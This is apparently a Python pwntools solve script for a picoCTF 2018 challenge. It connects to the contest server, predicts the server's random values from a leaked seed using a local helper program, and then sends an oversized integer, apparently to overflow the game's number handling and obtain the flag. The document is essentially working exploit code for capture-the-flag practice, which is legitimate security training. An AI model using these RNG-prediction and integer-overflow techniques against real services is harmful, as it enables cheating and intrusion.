from pwn import *
import re
from subprocess import Popen, PIPE, STDOUT

large_inp = 2684354560

r = remote("2018shell3.picoctf.com", "26662")

initial_text = r.recvuntil("> ")
print initial_text

seed = int(re.findall("(\d*)\sto", initial_text)[1])

p = Popen(['./seed_gen', str(seed), "6"], stdout=PIPE, stdin=PIPE, stderr=STDOUT)
guess1 = p.stdout.readline().rstrip()
p.stdout.readline().rstrip()
guess2 = p.stdout.readline().rstrip()
p.stdout.readline().rstrip()
guess3 = p.stdout.readline().rstrip()
p.stdout.readline().rstrip()

r.sendline("1")
r.sendline(guess1)
print r.recvuntil("> ")


r.sendline("1")
print r.recvuntil("> ")
r.sendline(guess2)
print r.recvuntil("> ")


r.sendline("1")
print r.recvuntil("> ")
r.sendline(guess3)
print r.recvuntil("> ")


r.sendline(str(large_inp))
print r.recvuntil("> ")
r.sendline("1")
print r.recvuntil("> ")

print r.recvrepeat() #("> ")



r.close()